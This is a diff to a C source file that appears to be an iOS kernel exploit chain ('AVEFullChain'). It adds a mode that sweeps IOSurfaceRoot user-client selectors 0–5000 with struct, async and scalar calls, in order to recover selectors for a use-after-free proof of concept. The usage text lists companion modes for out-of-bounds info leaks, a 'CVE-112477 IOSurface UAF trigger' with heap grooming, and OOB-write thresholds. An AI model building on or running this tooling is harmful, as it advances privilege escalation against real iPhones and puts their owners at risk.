@@ -9264,6 +9264,175 @@ vps_cd_done:
 
         rlog("\n=== IOSURFACE_UAF complete ===\n");
 
+    } else if (strcmp(mode, "iosurface_enum") == 0) {
+        /* Exhaustive IOSurfaceRootUserClient selector enumeration.
+         * The PoC uses selectors 17/18/1000 but on iOS 27.1/A20 Pro these
+         * return kIOReturnUnsupported. The dispatch table has changed.
+         * This mode sweeps selectors 0-2000 with sync struct, async struct,
+         * sync scalar, mixed, and different user client types. */
+        int max_sel = (argc > 2) ? atoi(argv[2]) : 500;
+        int test_async = (argc > 3) ? atoi(argv[3]) : 1;
+        if (max_sel < 10) max_sel = 10;
+        if (max_sel > 5000) max_sel = 5000;
+
+        rlog("=== IOSURFACE_ENUM: Exhaustive selector scan 0-%d ===\n", max_sel);
+        rlog("async=%d\n\n", test_async);
+
+        io_service_t svc = IOServiceGetMatchingService(
+            kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+        if (!svc) {
+            rlog("FAIL: IOSurfaceRoot service not found\n");
+            goto done;
+        }
+
+        /* Try multiple user client types */
+        rlog("--- Phase 1: User client type enumeration ---\n");
+        for (uint32_t uctype = 0; uctype < 8; uctype++) {
+            io_connect_t c = 0;
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), uctype, &c);
+            rlog("  type %u: 0x%08x conn=0x%x\n", uctype, kr, c);
+            if (kr == KERN_SUCCESS && c) IOServiceClose(c);
+        }
+
+        /* Open connection for scanning */
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+        if (kr != KERN_SUCCESS) {
+            rlog("FAIL: Cannot open IOSurfaceRoot: 0x%08x\n", kr);
+            IOObjectRelease(svc);
+            goto done;
+        }
+
+        /* Create a test surface for surface_id references */
+        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int tw = 32, th = 32, tbpe = 4, tbpr = 128;
+        CFNumberRef twn = CFNumberCreate(NULL, kCFNumberIntType, &tw);
+        CFNumberRef thn = CFNumberCreate(NULL, kCFNumberIntType, &th);
+        CFNumberRef tbn = CFNumberCreate(NULL, kCFNumberIntType, &tbpe);
+        CFNumberRef tbrn = CFNumberCreate(NULL, kCFNumberIntType, &tbpr);
+        int tpf = 0x42475241;
+        CFNumberRef tpfn = CFNumberCreate(NULL, kCFNumberIntType, &tpf);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), twn);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), thn);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerElement"), tbn);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), tbrn);
+        CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), tpfn);
+        IOSurfaceRef ts = IOSurfaceCreate(sp);
+        uint32_t tsid = ts ? IOSurfaceGetID(ts) : 1;
+        rlog("Test surface: ID=%u\n\n", tsid);
+
+        /* Phase 2: Sync struct scan */
+        rlog("--- Phase 2: Sync IOConnectCallStructMethod (sel 0-%d) ---\n", max_sel);
+        int sync_hits = 0;
+        uint32_t input_sizes[] = {0, 4, 8, 16, 24, 32, 64, 128, 256};
+        for (uint32_t sel = 0; sel <= (uint32_t)max_sel; sel++) {
+            for (int si = 0; si < 9; si++) {
+                uint8_t ibuf[256];
+                memset(ibuf, 0, sizeof(ibuf));
+                /* Fill with surface_id + pattern */
+                uint32_t sid_val = tsid;
+                if (input_sizes[si] >= 4) memcpy(ibuf, &sid_val, 4);
+                uint64_t *i64 = (uint64_t *)ibuf;
+                if (input_sizes[si] >= 24) { i64[0] = 1; i64[1] = 2; i64[2] = 3; }
+
+                uint8_t obuf[512];
+                size_t osz = sizeof(obuf);
+                kern_return_t r = IOConnectCallStructMethod(conn, sel,
+                    ibuf, input_sizes[si], obuf, &osz);
+
+                if (r != (kern_return_t)0xE00002C2 /* unsupported */
+                    && r != (kern_return_t)0xe00002bd /* badArgument */) {
+                    rlog("  SYNC sel %4u (%3uB): 0x%08x", sel, input_sizes[si], r);
+                    if (osz > 0 && r == KERN_SUCCESS) {
+                        rlog(" out=%zu [", osz);
+                        for (size_t j = 0; j < (osz > 16 ? 16 : osz); j++)
+                            rlog("%02x", obuf[j]);
+                        rlog("]");
+                    }
+                    rlog("\n");
+                    sync_hits++;
+                    break; /* Found a working size, move to next selector */
+                }
+            }
+            if (sel > 0 && sel % 200 == 0)
+                rlog("  ... scanned to sel %u (%d hits so far)\n", sel, sync_hits);
+        }
+        rlog("Sync scan: %d selectors responded (non-unsupported)\n\n", sync_hits);
+
+        /* Phase 3: Async struct scan (if enabled) */
+        if (test_async) {
+            rlog("--- Phase 3: Async IOConnectCallAsyncStructMethod (sel 0-%d) ---\n", max_sel);
+            int async_hits = 0;
+
+            for (uint32_t sel = 0; sel <= (uint32_t)max_sel; sel++) {
+                for (int si = 0; si < 9; si++) {
+                    uint8_t ibuf[256];
+                    memset(ibuf, 0, sizeof(ibuf));
+                    uint32_t sid_val = tsid;
+                    if (input_sizes[si] >= 4) memcpy(ibuf, &sid_val, 4);
+                    uint64_t *i64 = (uint64_t *)ibuf;
+                    if (input_sizes[si] >= 24) { i64[0] = 1; i64[1] = 2; i64[2] = 3; }
+
+                    mach_port_t wp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                    mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+
+                    uint64_t ref[8] = {0};
+                    kern_return_t r = IOConnectCallAsyncStructMethod(
+                        conn, sel, wp, ref, 0,
+                        ibuf, input_sizes[si], NULL, NULL);
+
+                    mach_port_deallocate(mach_task_self(), wp);
+
+                    if (r != (kern_return_t)0xE00002C2
+                        && r != (kern_return_t)0xe00002bd) {
+                        rlog("  ASYNC sel %4u (%3uB): 0x%08x\n", sel, input_sizes[si], r);
+                        async_hits++;
+                        break;
+                    }
+                }
+                if (sel > 0 && sel % 200 == 0)
+                    rlog("  ... scanned to sel %u (%d hits so far)\n", sel, async_hits);
+            }
+            rlog("Async scan: %d selectors responded\n\n", async_hits);
+        }
+
+        /* Phase 4: Sync scalar scan */
+        rlog("--- Phase 4: Sync scalar IOConnectCallMethod (sel 0-%d) ---\n", max_sel);
+        int scalar_hits = 0;
+        for (uint32_t sel = 0; sel <= (uint32_t)max_sel; sel++) {
+            uint64_t sin[6] = { tsid, 0, 1, 2, 3, 0 };
+            uint64_t sout[6] = {0};
+            uint32_t sout_cnt = 6;
+            kern_return_t r = IOConnectCallMethod(conn, sel,
+                sin, 1, NULL, 0, sout, &sout_cnt, NULL, NULL);
+            if (r != (kern_return_t)0xE00002C2
+                && r != (kern_return_t)0xe00002bd) {
+                rlog("  SCALAR sel %4u (1 in): 0x%08x", sel, r);
+                if (sout_cnt > 0) {
+                    rlog(" out=[");
+                    for (uint32_t j = 0; j < sout_cnt; j++)
+                        rlog("%llx,", sout[j]);
+                    rlog("]");
+                }
+                rlog("\n");
+                scalar_hits++;
+            }
+            if (sel > 0 && sel % 200 == 0)
+                rlog("  ... scanned to sel %u (%d hits so far)\n", sel, scalar_hits);
+        }
+        rlog("Scalar scan: %d selectors responded\n\n", scalar_hits);
+
+        /* Cleanup */
+        if (ts) CFRelease(ts);
+        CFRelease(sp); CFRelease(twn); CFRelease(thn);
+        CFRelease(tbn); CFRelease(tbrn); CFRelease(tpfn);
+        IOServiceClose(conn);
+        IOObjectRelease(svc);
+
+        rlog("=== IOSURFACE_ENUM complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -9316,6 +9485,7 @@ vps_cd_done:
         rlog("  dimension_oob [max_tl] [aid] -- KEY: Info leak via NumberOfTemporalLayers OOB\n");
         rlog("  vps_byte_dump [max_aid] -- KEY: Dump VPS bytes at OOB AlphaLayerID (info leak)\n");
         rlog("  iosurface_uaf [rounds] [groom] [threads] -- KEY: CVE-112477 IOSurface UAF trigger\n");
+        rlog("  iosurface_enum [max_sel] [async]  -- KEY: Exhaustive IOSurface selector scan\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
